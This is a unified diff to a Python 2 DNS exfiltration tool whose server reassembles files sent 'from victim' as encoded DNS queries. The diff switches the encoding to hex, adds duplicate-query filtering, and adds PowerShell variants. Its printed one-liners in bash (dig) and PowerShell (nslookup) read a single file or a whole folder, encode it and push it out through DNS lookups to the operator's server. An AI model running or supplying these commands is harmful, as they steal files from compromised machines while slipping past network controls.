@@ -1,11 +1,7 @@
 #!/usr/bin/env python
 #  g0dmode
+#  lefayjey
 ########################
-#
-# TODO (in order of priority):
-#
-# * Windows PowerShell command variant (This will be 2.1 coming soon). 
-# * fix bugs when no filename is entered (i know it exists just cba atm)
 #
 
 import socket
@@ -18,7 +14,7 @@ import re
 import base64
 
 c = { "r" : "\033[1;31m", "g": "\033[1;32m", "y" : "\033[1;33m", "b" : "\033[1;34m", "e" : "\033[0m" }
-VERSION = "2.0"
+VERSION = "3.0"
 	
 class DNSQuery:
 	def __init__(self, data):
@@ -52,7 +48,7 @@ def save_to_file(r_data, z, v):
 	for key,value in r_data.iteritems():
 		
 		file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
-		fname = "recieved_%s_%s" % (file_seed, key) 
+		fname = "received_%s_%s" % (file_seed, key) 
 		flatdata = ""
 
 		for block in value:
@@ -68,11 +64,11 @@ def save_to_file(r_data, z, v):
 		try:
 			if v:
 			        print "%s[Info]%s base64 decoding data (%s)." % (c["y"], c["e"], key)
-			flatdata = base64.b64decode(flatdata) # test if padding correct by using a try/catch
+			flatdata = base64.b64decode(flatdata.decode("hex")) # test if padding correct by using a try/catch
 		except:
 			f.close()
 			print "%s[Error]%s Incorrect padding on base64 encoded data.." % (c["r"], c["e"])
-			exit(1)				
+			exit(1)
 
 		if (z):
 			if v:
@@ -132,20 +128,23 @@ def p_cmds(s,b,ip,z):
 
 	if (z):
 		print "%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | hexdump -v -e '/1 "%%02x" '| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | hexdump -v -e '/1 "%%02x" ' | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 	else:
 		print "%s[?]%s Copy individual file" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| hexdump -v -e '/1 "%%02x" '| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f |  hexdump -v -e '/1 "%%02x" '| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print
+		print "%s[?]%s Copy individual file in PowerShell" % (c["y"], c["e"])
+		print """\t%s\x23%s $f="file.txt"; $d="%s"; $s=%s; $b=%s; $y = Resolve-Path $f; $z = [System.IO.File]::ReadAllBytes($y); $e = [System.Convert]::ToBase64String($z); $a = $e | Format-Hex;  $g = ($a.Bytes | ForEach-Object {"{0:X}" -f $_}) -join ''; $l=$g.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$g.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$f. $d; $r="" } $n=$n+1 } nslookup -type=A $r$f. $d""" % (c["r"], c["e"], ip, s, b )
 		print
 		print "%s[?]%s Copy entire folder in PowerShell" % (c["y"], c["e"])
-		print """\t%s\x23%s $d="%s"; $s=%s; $b=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }""" % (c["r"], c["e"], ip, s, b )
+		print """\t%s\x23%s $d="%s"; $s=%s; $b=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $f = $e | Format-Hex;  $g = ($f.Bytes | ForEach-Object {"{0:X}" -f $_}) -join ''; $l=$g.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$g.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }""" % (c["r"], c["e"], ip, s, b )
 		print
 		
 
@@ -214,12 +213,16 @@ if __name__ == '__main__':
   
 	try:
 		r_data = {}
+		prev_data=""
 		while 1:
       			# There is a bottle neck in this function, if very slow PC, will take
 			# slightly longer to send as this main loop recieves the data from victim.
 
 			data, addr = udp.recvfrom(1024)
 			p=DNSQuery(data)
+			if p.data_text.lower() == prev_data.lower():
+				continue
+			prev_data=p.data_text
 			udp.sendto(p.request(ip), addr)
 	
 			req_split = p.data_text.split(".")
@@ -234,7 +237,7 @@ if __name__ == '__main__':
 					tmp_data.append(req_split[n])
 				else:
 					# Filename
-					fname += req_split[n] + "."
+					fname += req_split[n].lower() + "."
 
 			fname = fname[:-1]
 
